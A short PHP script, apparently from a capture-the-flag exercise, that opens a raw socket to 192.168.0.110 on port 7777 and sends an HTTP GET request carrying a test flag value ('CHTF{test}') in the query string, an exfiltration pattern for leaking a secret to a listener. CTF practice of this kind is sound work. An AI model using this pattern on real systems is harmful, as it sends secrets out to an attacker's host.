<?php
$flag = "CHTF{test}";
$host = "192.168.0.110";
$request = "GET /?{$flag} HTTP/1.0\r\n";
$request .= "Host: {$host}\r\n";
$request .= "\r\n";

$socket = fsockopen($host,7777,$errstr,$errno,1);
fputs($socket,$request);
fclose($socket);